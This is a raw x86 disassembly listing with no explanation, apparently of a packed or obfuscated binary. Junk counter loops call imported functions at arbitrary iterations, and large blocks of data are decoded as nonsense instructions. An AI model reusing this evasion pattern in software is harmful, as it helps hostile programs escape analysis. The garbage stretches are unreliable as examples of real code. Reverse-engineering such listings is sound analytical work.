  4018dd:	fst    DWORD PTR [ecx]
  4018df:	cld    
  4018e0:	dec    eax
  4018e1:	ret    0x6b9e
  4018e4:	fstp   DWORD PTR [ebx+0x53a3cf25]
  4018ea:	dec    ebp
  4018eb:	dec    esi
  4018ec:	icebp  
  4018ed:	mov    es,esp
  4018ef:	sub    DWORD PTR [eax],esi
  4018f1:	xchg   esi,eax
  4018f2:	jb     0x4018cd
  4018f4:	ret    
  4018f5:	pop    esp
  4018f6:	fisub  WORD PTR [edi]
  4018f8:	push   0x1873252
  4018fd:	rcl    BYTE PTR es:[ecx],0xd8
  401901:	repnz out dx,al
  401903:	lahf   
  401904:	mov    edx,0x653d9cb9
  401909:	xor    BYTE PTR [ebp+eax*2-0x70],ch
  40190d:	rol    DWORD PTR [ebx-0x6d],0x43
  401911:	push   cs
  401912:	cmc    
  401913:	xor    edi,DWORD PTR [ebx-0x58]
  401916:	aam    0x5a
  401918:	cli    
  401919:	inc    ebp
  40191a:	xor    eax,0x605d47fc
  40191f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401920:	sub    DWORD PTR [ebx+0x49],ebx
  401923:	push   ds
  401924:	sbb    BYTE PTR [ebx-0x6c],cl
  401927:	add    esp,esi
  401929:	sti    
  40192a:	out    dx,eax
  40192b:	push   cx
  40192d:	jbe    0x4018d7
  40192f:	push   ss
  401930:	xchg   BYTE PTR [ebx-0x2b1613bb],cl
  401936:	cld    
  401937:	(bad)  
  401938:	dec    DWORD PTR [ebx+0x558bf445]
  40193e:	call   0x8d7ddb76
  401943:	imul   edi,DWORD PTR [edi+eiz*8+0xf],0xfffc5d84
  40194b:	dec    DWORD PTR [ebx+0x81f045]
  401951:	add    DWORD PTR ds:0x4fe90740,esi
  401957:	cld    
  401958:	(bad)  
  401959:	dec    DWORD PTR [ebx+0x3839e445]
  40195f:	je     0x4015a9
  401965:	mov    eax,0x800f1c9c
  40196a:	jmp    0x401622
  40196f:	push   ebp
  401970:	mov    ebp,esp
  401972:	sub    esp,0x44
  401975:	and    DWORD PTR ds:0x4292a1,0x0
  40197f:	mov    edx,DWORD PTR ds:0x4292a1
  401985:	inc    edx
  401986:	mov    DWORD PTR ds:0x4292a1,edx
  40198c:	cmp    DWORD PTR ds:0x4292a1,0x4
  401993:	jne    0x4019a4
  401999:	push   0x6284
  40199e:	call   DWORD PTR ds:0x4278e7
  4019a4:	cmp    DWORD PTR ds:0x4292a1,0x3
  4019ab:	jne    0x4019be
  4019b1:	mov    edx,DWORD PTR ds:0x4292a1
  4019b7:	inc    edx
  4019b8:	mov    DWORD PTR ds:0x4292a1,edx
  4019be:	cmp    DWORD PTR ds:0x4292a1,0x18
  4019c5:	jb     0x40197f
  4019cb:	push   edi
  4019cc:	jmp    0x401aec
  4019d1:	sbb    al,0xdb
  4019d3:	fcmovu st,st(6)
  4019d5:	std    
  4019d6:	sar    DWORD PTR [eax],1
  4019d8:	fstp   QWORD PTR [edi]
  4019da:	or     BYTE PTR [edx+0x571a8bfd],0xdc
  4019e1:	cld    
  4019e2:	jae    0x401a60
  4019e4:	jl     0x401a57
  4019e6:	jg     0x401a64
  4019e8:	jl     0x401a16
  4019ea:	fwait
  4019eb:	mov    DWORD PTR [ecx-0x784d66bd],edi
  4019f1:	ja     0x401a2d
  4019f3:	add    al,0x7a
  4019f5:	das    
  4019f6:	fmul   DWORD PTR [edi-0x68f55d33]
  4019fc:	out    0xb,al
  4019fe:	fiadd  DWORD PTR [edx+0x57]
  401a01:	pusha  
  401a02:	pop    esi
  401a03:	into   
  401a04:	daa    
  401a05:	loop   0x401a5b
  401a07:	jne    0x401a45
  401a09:	pop    esi
  401a0a:	popf   
  401a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a0c:	pop    es
  401a0d:	pop    edi
  401a0f:	and    dl,dl
  401a11:	jno    0x401a85
  401a13:	das    
  401a14:	add    eax,0xddeb7e2
  401a19:	es mov ch,0x7a
  401a1c:	aas    
  401a1d:	adc    DWORD PTR [esi-0x7c1c0a1c],ebx
  401a23:	mov    bh,0xd4
  401a25:	add    ah,ch
  401a27:	xor    ebx,edx
  401a29:	ret    
  401a2a:	xor    eax,0xd9444ea5
  401a2f:	leave  
  401a30:	jg     0x401a9e
  401a32:	sti    
  401a33:	sahf   
  401a34:	cli    
  401a35:	mov    al,0x6b
  401a37:	mov    ecx,0x56d26fc8
  401a3c:	inc    esi
  401a3d:	mov    ds:0x3609733f,al
  401a42:	pop    ss
  401a43:	repz into 
  401a45:	in     al,dx
  401a46:	in     eax,dx
  401a47:	iret   
  401a48:	mov    ebx,0xd6958bf6
  401a4d:	pop    edi
  401a4e:	in     eax,0x4a
  401a50:	dec    ebp
  401a51:	or     DWORD PTR [ecx],esi
  401a53:	sbb    ebp,0x8b1690ad
  401a59:	jnp    0x401a16
  401a5b:	pop    edi
  401a5c:	or     bh,ah
  401a5e:	hlt    
  401a5f:	out    0x3a,al
  401a61:	popf   
  401a62:	push   DWORD PTR [ecx-0x2fbf6ef8]
  401a68:	push   ecx
  401a69:	in     al,dx
  401a6a:	jle    0x401a6c
  401a6c:	ins    BYTE PTR es:[edi],dx
  401a6d:	mov    ebp,ecx
  401a6f:	inc    esp
  401a70:	mov    ds:0x99e9a99e,al
  401a75:	pop    ds
  401a76:	jecxz  0x401ad0
  401a78:	inc    esi
  401a79:	add    eax,0x3ba35c55
  401a7e:	cmc    
  401a7f:	cmp    al,0x44
  401a81:	hlt    
  401a82:	mov    esp,ecx
  401a84:	ds fst st(6)
  401a87:	inc    edi
  401a88:	or     al,BYTE PTR [eax+0x5a]
  401a8b:	sbb    DWORD PTR [ecx+ebx*4],ebx
  401a8e:	inc    ebx
  401a8f:	push   0x47
  401a91:	sub    eax,0x22d69950
  401a96:	ss or  al,0x29
  401a99:	(bad)  
  401a9a:	fadd   QWORD PTR [edx+ebp*2+0x3bfc0a4b]
  401aa1:	iret   
  401aa2:	mov    edi,0xb5f0f246
  401aa7:	push   0xffffff96
  401aa9:	mov    edx,0x10a57330
  401aae:	mov    ecx,0x260871d6
  401ab3:	pop    edx
  401ab4:	fnstsw WORD PTR [edx+0x6a5132d2]
  401aba:	cmp    DWORD PTR [esi+0x652ce322],ecx
  401ac0:	dec    ebx
  401ac1:	into   
  401ac2:	xchg   edx,eax
  401ac3:	xchg   ecx,eax
  401ac4:	fisttp QWORD PTR [ebx]
  401ac6:	xor    al,0xb2
  401ac8:	sub    eax,0x3052f347
  401acd:	push   cs
  401ace:	push   ecx
  401acf:	in     eax,dx
  401ad0:	xchg   ebx,eax
  401ad1:	(bad)  
  401ad2:	cmp    eax,0x281ff6f7
  401ad7:	fbld   TBYTE PTR [eax-0x7b1806c4]
  401add:	out    dx,al
  401ade:	scas   eax,DWORD PTR es:[edi]
  401adf:	push   0x245730b1
  401ae4:	pop    ecx
  401ae5:	outs   dx,DWORD PTR ds:[esi]
  401ae6:	sti    
  401ae7:	push   esi
  401ae8:	cmp    BYTE PTR [edi+0x46],0x6e
  401aec:	mov    eax,DWORD PTR [ebp+0xc]
  401aef:	and    DWORD PTR ds:0x4292cd,0x0
  401af9:	jmp    0x401b0b
  401afe:	mov    ecx,DWORD PTR ds:0x4292cd
  401b04:	inc    ecx
  401b05:	mov    DWORD PTR ds:0x4292cd,ecx
  401b0b:	cmp    DWORD PTR ds:0x4292cd,0x11
  401b12:	jae    0x401b69
  401b18:	cmp    DWORD PTR ds:0x4292cd,0x4
  401b1f:	jne    0x401b40
  401b25:	push   0x3f75
  401b2a:	push   0x4292cd
  401b2f:	push   DWORD PTR [ebp-0xc]
  401b32:	push   DWORD PTR [ebp-0xc]
  401b35:	push   0x5572
  401b3a:	call   DWORD PTR ds:0x4279bb
  401b40:	cmp    DWORD PTR ds:0x4292cd,0x3
  401b47:	jne    0x401b5a
  401b4d:	mov    ecx,DWORD PTR ds:0x4292cd
  401b53:	inc    ecx
  401b54:	mov    DWORD PTR ds:0x4292cd,ecx
  401b5a:	jmp    0x401afe
  401b5f:	mov    DWORD PTR ds:0x4292c9,0x72d4
  401b69:	mov    DWORD PTR [ebp-0x10],eax
  401b6c:	and    DWORD PTR ds:0x42c882,0x0
  401b76:	jmp    0x401b8a
  401b7b:	xor    ecx,ecx
  401b7d:	xor    ecx,DWORD PTR ds:0x42c882
  401b83:	inc    ecx
  401b84:	mov    DWORD PTR ds:0x42c882,ecx
  401b8a:	cmp    DWORD PTR ds:0x42c882,0x1c
  401b91:	jae    0x401bde
  401b97:	cmp    DWORD PTR ds:0x42c882,0x6
  401b9e:	jne    0x401bb9
  401ba4:	push   0x3a01
  401ba9:	push   0x1f68
  401bae:	push   0x4e47
  401bb3:	call   DWORD PTR ds:0x4278eb
  401bb9:	cmp    DWORD PTR ds:0x42c882,0x5
  401bc0:	jne    0x401bd3
  401bc6:	mov    ecx,DWORD PTR ds:0x42c882
  401bcc:	inc    ecx
  401bcd:	mov    DWORD PTR ds:0x42c882,ecx
  401bd3:	jmp    0x401b7b
  401bd8:	or     edx,0x1630
  401bde:	mov    eax,DWORD PTR [ebp+0x8]
  401be1:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  401be8:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  401bef:	mov    ecx,DWORD PTR ds:0x42c886
  401bf5:	xor    DWORD PTR ds:0x4292cd,ecx
  401bfb:	mov    edx,DWORD PTR [ebp+0x8]
  401bfe:	sbb    DWORD PTR ds:0x427d1f,0x4512
  401c08:	mov    DWORD PTR [ebp-0x40],eax
  401c0b:	mov    eax,0x7510857
  401c10:	adc    ecx,0xd62
  401c16:	jmp    0x401d36
  401c1b:	adc    eax,DWORD PTR [ecx-0x2451948]
  401c21:	push   ebp
  401c22:	pop    ebp
  401c23:	aaa    
  401c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c25:	popa   
  401c26:	lods   al,BYTE PTR ds:[esi]
  401c27:	ret    
  401c28:	jb     0x401c78
  401c2a:	std    
  401c2b:	icebp  
  401c2c:	jb     0x401caa
  401c2e:	jl     0x401ca1
  401c30:	jg     0x401cae
  401c32:	jl     0x401c27
  401c34:	jo     0x401bbc
  401c36:	fcmovnu st,st(3)
  401c38:	scas   eax,DWORD PTR es:[edi]
  401c39:	(bad)
  401c3c:	int3   
  401c3d:	fld    QWORD PTR [ebx+0x64]
  401c40:	int    0x5b
  401c42:	inc    ebx
  401c43:	mov    ebx,0xcd10d330
  401c48:	push   es
  401c49:	retf   0xac48
  401c4c:	ds in  eax,0x51
  401c4f:	jns    0x401c4d
  401c51:	dec    eax
  401c52:	sbb    DWORD PTR [edx+0x7e],0x7d
  401c56:	js     0x401cc0
  401c58:	ja     0x401c57
  401c5a:	push   esi
  401c5b:	pop    edi
  401c5c:	xlat   BYTE PTR ds:[ebx]
  401c5d:	std    
  401c5e:	mov    ch,0x50
  401c60:	push   ds
  401c61:	add    al,0x6a
  401c63:	mov    edi,0xde14b719
  401c68:	mov    dl,0x56
  401c6a:	retf   
  401c6b:	and    al,0xf7
  401c6d:	test   dl,bh
  401c6f:	scas   eax,DWORD PTR es:[edi]
  401c70:	fcmovbe st,st(7)
  401c72:	adc    bh,BYTE PTR [ebp+0x15]
  401c75:	pop    ebx
  401c76:	retf   
  401c77:	mov    ebp,0x33442015
  401c7c:	outs   dx,BYTE PTR ds:[esi]
  401c7d:	xor    eax,0xe92ff5
  401c82:	xor    ebp,DWORD PTR [ecx-0x4f772251]
  401c88:	(bad)  
  401c89:	stc    
  401c8a:	mov    ch,0x7
  401c8c:	leave  
  401c8d:	pop    esp
  401c8e:	mov    cl,0x44
  401c90:	ja     0x401c1e
  401c92:	dec    ecx
  401c93:	lods   al,BYTE PTR ds:[esi]
  401c94:	stos   BYTE PTR es:[edi],al
  401c95:	mov    eax,0xf3c3c28a
  401c9a:	pop    ss
  401c9b:	mul    BYTE PTR [ecx-0x1060cde3]
  401ca1:	cmp    DWORD PTR [ebx+0x1f811669],eax
  401ca7:	xor    DWORD PTR [ebp-0x32],eax
  401caa:	into   
  401cab:	mov    ch,0x95
  401cad:	pop    edx
  401cae:	sub    BYTE PTR [ebp+0x48],dl
  401cb1:	call   0xd9144c71
  401cb6:	bound  ecx,QWORD PTR [ecx]
  401cb8:	in     eax,dx
  401cb9:	loope  0x401d29
  401cbb:	mov    dh,0x23
  401cbd:	sti    
  401cbe:	in     al,dx
  401cbf:	dec    esi
  401cc0:	cmp    BYTE PTR [edi],dl
  401cc2:	xlat   BYTE PTR ds:[ebx]
  401cc3:	mov    ah,0x64
  401cc5:	inc    ebp
  401cc6:	adc    cl,BYTE PTR [ecx-0x452fa559]
  401ccc:	repnz inc eax
  401cce:	out    dx,eax
  401ccf:	or     al,0x71
  401cd1:	sbb    DWORD PTR [ebp-0x72],edx
  401cd4:	inc    edi
  401cd5:	cmc    
  401cd6:	out    0x23,al
  401cd8:	fcompp 
  401cda:	mov    ss,WORD PTR [eax]
  401cdc:	sub    BYTE PTR [ecx],0x6d
  401cdf:	sub    BYTE PTR [edi-0xa0a5da0],al
  401ce5:	dec    eax
  401ce6:	inc    esp
  401ce7:	aad    0xf6
  401ce9:	popf   
  401cea:	xor    DWORD PTR [ecx],edx
  401cec:	dec    esp
  401ced:	sbb    ah,bl
  401cef:	inc    ebp
  401cf1:	les    edx,FWORD PTR [ebx+0x2771f288]
  401cf7:	add    BYTE PTR [ecx+0x5f497576],al
  401cfd:	sbb    ch,BYTE PTR es:[eax+esi*2]
  401d01:	jno    0x401cfc
  401d03:	xlat   BYTE PTR ds:[ebx]
  401d04:	mov    ds:0xeeb66d66,al
  401d09:	or     BYTE PTR [ecx],cl
  401d0b:	fild   WORD PTR ds:0x918aa389
  401d11:	cmc    
  401d12:	retf   
  401d13:	xchg   esp,eax
  401d14:	inc    ecx
  401d15:	jg     0x401ca4
  401d17:	cmp    al,0xc9
  401d19:	xchg   edi,eax
  401d1a:	cmp    BYTE PTR [ebp+0x47],bh
  401d1d:	mov    edx,esp
  401d1f:	push   esi
  401d20:	mov    BYTE PTR [ecx+0x6c7d97dd],dl
  401d26:	xlat   BYTE PTR ds:[ebx]
  401d27:	ds push es
  401d29:	and    al,0xf3
  401d2b:	jge    0x401d41
  401d2d:	push   ebx
  401d2e:	pop    eax
  401d2f:	adc    esp,0xb3d3aef7
  401d35:	jecxz  0x401d6a
  401d37:	rol    BYTE PTR [ecx+0x4292c115],1
  401d3d:	add    BYTE PTR [esi-0x16ffffc4],dh
  401d43:	sbb    eax,DWORD PTR [ecx]
  401d45:	add    BYTE PTR [eax],al
  401d47:	(bad)  
  401d48:	mov    eax,0x13bd709b
  401d4d:	cdq    
  401d4e:	mov    edx,0x91382f2
  401d53:	mov    ebx,DWORD PTR [eax+0x75f25f2a]
  401d59:	jl     0x401dd7
  401d5b:	jno    0x401ddc
  401d5d:	jl     0x401ddb
  401d5f:	ss ror BYTE PTR cs:[esi+0x37],0xb3
  401d65:	stc    
  401d66:	repnz aas 
  401d68:	les    ebp,FWORD PTR [edi+0x1d]
  401d6b:	jmp    0x8203:0x3e08e854
  401d72:	mov    al,ds:0x4ba6fb12
  401d77:	shr    dl,1
  401d79:	jmp    0x401dee
  401d7b:	cld    
  401d7c:	ins    DWORD PTR es:[edi],dx
  401d7d:	xchg   ecx,eax
  401d7e:	mov    bh,0xec
  401d80:	sub    esp,DWORD PTR [esi+0x5afcde84]
  401d86:	fwait
  401d87:	xchg   esi,eax
  401d88:	sub    BYTE PTR [eax-0x47027992],ch
  401d8e:	xor    eax,0x9c290e2b
  401d93:	push   es
  401d94:	sbb    esi,DWORD PTR [edx-0x375b2db0]
  401d9a:	mov    esi,0x6f80321
  401d9f:	pushf  
  401da0:	ins    DWORD PTR es:[edi],dx
  401da1:	leave  
  401da2:	ins    BYTE PTR es:[edi],dx
  401da3:	xchg   esp,eax
  401da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401da5:	sbb    BYTE PTR [edi+0x65],al
  401da8:	popa   
  401da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401daa:	bound  edx,QWORD PTR [esi]
  401dac:	les    ecx,FWORD PTR [esi-0x61]
  401daf:	ds inc esp
  401db1:	mov    ds:0x27d83f9,eax
  401db6:	int3   
  401db7:	mov    dl,0x1e
  401db9:	shr    ebx,cl
  401dbb:	repz pop es
  401dbd:	ds push esi
  401dbf:	dec    edx
  401dc0:	mov    ebp,ebp
  401dc2:	xlat   BYTE PTR ds:[ebx]
  401dc3:	js     0x401e40
  401dc5:	inc    ebx
  401dc6:	mov    edi,0x3687fe56
  401dcb:	mov    cl,0x2c
  401dcd:	call   0x2c896007
  401dd2:	push   ds
  401dd3:	les    edi,FWORD PTR [edi+edx*1+0x737e3f40]
  401dda:	ja     0x401db0
  401ddc:	mov    ebx,0x36d3f22d
  401de1:	add    ebp,DWORD PTR [ebx-0x31]
  401de4:	and    eax,0xaf864fb0
  401de9:	fdivr  st,st(2)
  401deb:	retf   0x2ac7
  401dee:	enter  0xe453,0x31
  401df2:	arpl   cx,dx
  401df4:	jae    0x401e4e
  401df6:	or     dh,BYTE PTR [ebx-0x6f]
  401df9:	sub    eax,0xe394f50e
  401dfe:	lods   eax,DWORD PTR ds:[esi]
  401dff:	repz imul ebx,DWORD PTR [ebp-0x1d95f0de],0x7c
  401e07:	loope  0x401de7
  401e09:	push   edi
  401e0a:	in     eax,dx
  401e0b:	pop    ebx
  401e0c:	loope  0x401e4e
  401e0e:	push   ds
  401e0f:	cli    
  401e10:	(bad)  [ebx]
  401e12:	sub    edx,ebp
  401e14:	mov    bl,0xf8
  401e16:	rcr    BYTE PTR [ecx+0x3985d7af],cl
  401e1c:	popa   
  401e1d:	mov    bl,BYTE PTR [edx+0x6e3b95a7]
  401e23:	icebp  
  401e24:	loope  0x401e7b
  401e26:	jne    0x401e6f
  401e28:	cdq    
  401e29:	pop    esi
  401e2a:	mov    dh,0xf4
  401e2c:	push   0xf17fbb06
  401e31:	xchg   edi,eax
  401e32:	call   0x953a3a3c
  401e37:	out    0xbe,al
  401e39:	jmp    0x401eba
  401e3b:	mov    ebp,0x41640bb1
  401e40:	jne    0x401dd4
  401e42:	push   ebx
  401e43:	adc    al,BYTE PTR [eax+0x60]
  401e46:	stc    
  401e47:	xchg   esi,eax
  401e48:	call   0xfdc5:0x888adc9a
  401e4f:	int3   
  401e50:	je     0x401e53
  401e52:	and    DWORD PTR [esi+0x14],esp
  401e55:	cwde   
  401e56:	call   0x3f4400ce
  401e5b:	inc    esp
  401e5c:	jmp    0x401dde
  401e5e:	xchg   ebp,eax
  401e5f:	imul   ebx,DWORD PTR [esi+0x729eb9da],0xd110032
  401e69:	pop    ss
  401e6a:	jge    0x401eae
  401e6c:	add    BYTE PTR [ebx],al
  401e6e:	shl    DWORD PTR [ebx],1
  401e70:	cmp    eax,0x4292a1
  401e75:	mov    DWORD PTR [ebp-0x8],edx
  401e78:	adc    DWORD PTR ds:0x427d07,0x2336
  401e82:	mov    edx,DWORD PTR [ebp+0x8]
  401e85:	and    DWORD PTR ds:0x427d1b,0x0
  401e8f:	mov    edi,DWORD PTR ds:0x427d1b
  401e95:	inc    edi
  401e96:	mov    DWORD PTR ds:0x427d1b,edi
  401e9c:	cmp    DWORD PTR ds:0x427d1b,0x2b
  401ea3:	jne    0x401eb2
  401ea9:	push   DWORD PTR [ebp-0x1c]
  401eac:	call   DWORD PTR ds:0x427a8b
  401eb2:	cmp    DWORD PTR ds:0x427d1b,0x1e
  401eb9:	jb     0x401e8f
  401ebf:	mov    edi,DWORD PTR ds:0x4292d9
  401ec5:	and    DWORD PTR ds:0x427d13,edi
  401ecb:	xor    edx,eax
  401ecd:	adc    edi,DWORD PTR ds:0x4292c9
  401ed3:	add    edx,ecx
  401ed5:	mov    DWORD PTR ds:0x4275b0,0x10
  401edf:	cmp    DWORD PTR ds:0x4275b0,0x0
  401ee6:	je     0x401f33
  401eec:	cmp    DWORD PTR ds:0x4275b0,0x6
  401ef3:	jne    0x401f07
  401ef9:	push   DWORD PTR [ebp-0x10]
  401efc:	push   0x12c3
  401f01:	call   DWORD PTR ds:0x4279bf
  401f07:	cmp    DWORD PTR ds:0x4275b0,0x7
  401f0e:	jne    0x401f21
  401f14:	mov    edi,DWORD PTR ds:0x4275b0
  401f1a:	dec    edi
  401f1b:	mov    DWORD PTR ds:0x4275b0,edi
  401f21:	mov    edi,DWORD PTR ds:0x4275b0
  401f27:	dec    edi
  401f28:	mov    DWORD PTR ds:0x4275b0,edi
  401f2e:	jmp    0x401edf
  401f33:	mov    DWORD PTR [ebp+0xc],edx
  401f36:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  401f3d:	xor    edi,edi
  401f3f:	add    edi,DWORD PTR ds:0x427d1f
  401f45:	adc    DWORD PTR ds:0x4292c9,edi
  401f4b:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  401f52:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  401f59:	and    DWORD PTR ds:0x42c896,0x0
  401f63:	jmp    0x401f77
  401f68:	xor    edi,edi
  401f6a:	or     edi,DWORD PTR ds:0x42c896
  401f70:	inc    edi
  401f71:	mov    DWORD PTR ds:0x42c896,edi
  401f77:	cmp    DWORD PTR ds:0x42c896,0x1c
  401f7e:	jae    0x401fc4
  401f84:	cmp    DWORD PTR ds:0x42c896,0xe
  401f8b:	jne    0x401fa3
  401f91:	push   0x0
  401f93:	push   0x55c0
  401f98:	push   0x3960
  401f9d:	call   DWORD PTR ds:0x427a8f
  401fa3:	cmp    DWORD PTR ds:0x42c896,0xd
  401faa:	jne    0x401fbd
  401fb0:	mov    edi,DWORD PTR ds:0x42c896
  401fb6:	inc    edi
  401fb7:	mov    DWORD PTR ds:0x42c896,edi
  401fbd:	jmp    0x401f68
  401fc2:	and    edi,edi
  401fc4:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  401fcb:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  401fd2:	and    DWORD PTR ds:0x4292bd,0x0
  401fdc:	mov    edi,DWORD PTR ds:0x4292bd
  401fe2:	inc    edi
  401fe3:	mov    DWORD PTR ds:0x4292bd,edi
  401fe9:	cmp    DWORD PTR ds:0x4292bd,0x15
  401ff0:	jne    0x402006
  401ff6:	push   0x3d92
  401ffb:	push   0x4275c4
  402000:	call   DWORD PTR ds:0x4279c3
  402006:	cmp    DWORD PTR ds:0x4292bd,0x12
  40200d:	jb     0x401fdc
  402013:	and    edi,0x7576
  402019:	jmp    0x402139
  40201e:	loopne 0x402062
  402020:	sbb    edx,ebp
  402022:	mov    ecx,0xbb5ae36d
  402027:	xchg   esp,eax
  402028:	inc    eax
  402029:	pop    es
  40202a:	inc    BYTE PTR [ebp+0x74f7c5e7]
  402030:	jl     0x4020ae
  402032:	jno    0x4020b3
  402034:	jl     0x4020b2
  402036:	stos   BYTE PTR es:[edi],al
  402037:	out    dx,eax
  402038:	(bad)  [edi+0x6d97b249]
  40203e:	mov    esp,edx
  402040:	mov    ebp,DWORD PTR [edi-0x44]
  402043:	inc    esi
  402044:	or     DWORD PTR [eax+0x34],ecx
  402047:	sub    BYTE PTR [ecx],ch
  402049:	shl    BYTE PTR [edx],cl
  40204b:	sbb    ah,dh
  40204d:	faddp  st(5),st
  40204f:	push   ds
  402050:	and    DWORD PTR [edi+0x11819e41],0xb9504c6
  40205a:	std    
  40205b:	mov    esi,0x1dfd44a0
  402060:	out    0x92,eax
  402062:	inc    edi
  402063:	jnp    0x402071
  402065:	jmp    0xb5e93cd2
  40206a:	xor    eax,DWORD PTR [eax+0x2fd35939]
  402070:	mov    edx,0xcfeed4b1
  402075:	push   edi
  402076:	dec    edx
  402077:	xchg   ebp,eax
  402078:	mov    ds:0x4b824a72,al
  40207e:	sbb    DWORD PTR [eax+0xe48911],esp
  402084:	xchg   esi,eax
  402085:	inc    ebx
  402086:	or     DWORD PTR [eax-0x75],edx
  402089:	jo     0x402072
  40208b:	fsub   st,st(5)
  40208d:	(bad)  
  40208e:	xor    BYTE PTR [esi+0x455272f4],dl
  402094:	mov    cl,0xcd
  402096:	xor    ch,BYTE PTR [esi+0x101de2e0]
  40209c:	add    bh,dh
  40209e:	mov    ax,ds:0x2be94c85
  4020a4:	fs inc ebx
  4020a6:	cmp    BYTE PTR [esi+0x518a68bc],0xeb
  4020ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020ae:	pop    es
  4020af:	pushf  
  4020b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020b1:	xchg   edx,eax
  4020b2:	mov    ds:0x9cbc7d11,eax
  4020b7:	jbe    0x40207c
  4020b9:	sti    
  4020ba:	leave  
  4020bb:	jns    0x4020aa
  4020bd:	int3   
  4020be:	mov    ds:0xb99a8819,al
  4020c3:	in     eax,dx
  4020c4:	xchg   ebp,eax
  4020c5:	or     BYTE PTR [edi*2+0x351e6c55],al
  4020cc:	lods   eax,DWORD PTR ds:[esi]
  4020cd:	shl    DWORD PTR [edi],cl
  4020cf:	cs ror cl,cl
  4020d2:	cmc    
  4020d3:	or     ebp,DWORD PTR [ecx-0x7823f0c4]
  4020d9:	ret    0x1174
  4020dc:	add    eax,0xbc36c808
  4020e1:	adc    eax,DWORD PTR [ebp+0x79]
  4020e4:	or     DWORD PTR [eax],edx
  4020e6:	xchg   ebx,eax
  4020e7:	icebp  
  4020e8:	xlat   BYTE PTR ds:[ebx]
  4020e9:	and    al,BYTE PTR [ecx-0xbee3c19]
  4020ef:	loop   0x4020f4
  4020f1:	(bad)  
  4020f2:	jmp    0x5cd73ce0
  4020f7:	or     al,0x15
  4020f9:	std    
  4020fa:	cmp    al,0xe2
  4020fc:	cmp    BYTE PTR [ecx],ch
  4020fe:	pop    ebx
  4020ff:	addr16 stc 
  402101:	jo     0x402141
  402103:	retf   0x9c2
  402106:	sbb    eax,0xb70b3691
  40210b:	push   edi
  40210c:	mov    ds:0x855f13a7,eax
  402111:	cmp    esp,DWORD PTR [ecx]
  402113:	iret   
  402114:	cmp    al,0x5
  402116:	mov    cl,ah
  402118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402119:	enter  0x48c2,0xec
  40211d:	jl     0x402148
  40211f:	fisub  DWORD PTR [edi]
  402121:	xor    eax,0xb197d0c7
  402126:	call   0xb8c63653
  40212b:	cmp    DWORD PTR [ecx],ebx
  40212d:	out    dx,eax
  40212e:	retf   
  40212f:	fcmovnb st,st(2)
  402131:	xchg   esi,eax
  402132:	retf   
  402133:	or     ebx,ebx
  402135:	addr16 das 
  402137:	ret    0xc7af
  40213a:	inc    ebp
  40213b:	enter  0x853f,0x9c
  40213f:	clc    
  402140:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  402147:	or     edx,edi
  402149:	mov    edx,DWORD PTR [ebp+0x8]
  40214c:	xor    edx,eax
  40214e:	mov    edi,DWORD PTR [ebp-0x10]
  402151:	neg    DWORD PTR ds:0x4292b5
  402157:	add    edx,ecx
  402159:	mov    DWORD PTR ds:0x4292bd,0x7886
  402163:	cmp    edi,edx
  402165:	je     0x402c82
  40216b:	mov    DWORD PTR ds:0x4292c5,0x3488
  402175:	push   ebx
  402176:	jmp    0x402c5d
  40217b:	mov    edx,DWORD PTR [ebp-0x8]
  40217e:	or     DWORD PTR ds:0x42c892,0x427cf7
  402188:	mov    edi,DWORD PTR [ebp-0x10]
  40218b:	mov    DWORD PTR ds:0x4292c1,0x6c77
  402195:	sub    edi,edx
  402197:	and    DWORD PTR ds:0x4292dd,0x0
  4021a1:	mov    edx,DWORD PTR ds:0x4292dd
  4021a7:	inc    edx
  4021a8:	mov    DWORD PTR ds:0x4292dd,edx
  4021ae:	cmp    DWORD PTR ds:0x4292dd,0x8
  4021b5:	jne    0x4021c9
  4021bb:	push   0x61e8
  4021c0:	push   DWORD PTR [ebp-0x14]
  4021c3:	call   DWORD PTR ds:0x4279c7
  4021c9:	cmp    DWORD PTR ds:0x4292dd,0x7
  4021d0:	jne    0x4021e3
  4021d6:	mov    edx,DWORD PTR ds:0x4292dd
  4021dc:	inc    edx
  4021dd:	mov    DWORD PTR ds:0x4292dd,edx
  4021e3:	cmp    DWORD PTR ds:0x4292dd,0x1a
  4021ea:	jb     0x4021a1
  4021f0:	xor    DWORD PTR ds:0x427cf7,0x6435
  4021fa:	mov    edx,DWORD PTR [ebp-0x4]
  4021fd:	xor    edx,eax
  4021ff:	xor    DWORD PTR ds:0x427cff,0x42c896
  402209:	add    edx,ecx
  40220b:	cmp    edi,edx
  40220d:	mov    DWORD PTR ds:0x42c892,0x3c1d
  402217:	jb     0x402c81
  40221d:	mov    edx,DWORD PTR [ebp-0x28]
  402220:	jmp    0x402340
  402225:	fstp   DWORD PTR [edi-0x39]
  402228:	xlat   BYTE PTR ds:[ebx]
  402229:	jns    0x402292
  40222b:	stc    
  40222c:	popa   
  40222d:	mov    ebx,0x3f3fc869
  402232:	pop    ebp
  402233:	arpl   WORD PTR [edi-0x78],bx
  402236:	ja     0x4022b4
  402238:	jl     0x4022ab
  40223a:	jg     0x4022b8
  40223c:	jl     0x4021fb
  40223e:	inc    ebx
  40223f:	dec    esp
  402240:	sub    BYTE PTR [ecx+0x72],dh
  402243:	mov    eax,0x5c91b216
  402248:	pop    ebx
  402249:	push   ebp
  40224a:	sbb    eax,0xc8ab2163
  40224f:	adc    BYTE PTR [esi+0x27bc611d],al
  402255:	mul    ebp
  402257:	scas   eax,DWORD PTR es:[edi]
  402258:	mov    edx,eax
  40225a:	loop   0x40220f
  40225c:	popf   
  40225d:	call   0x73e0d20a
  402262:	jmp    0xa7f6:0x3a8821cd
  402269:	jl     0x4022b6
  40226b:	xor    edi,DWORD PTR [esi-0x5db02d13]
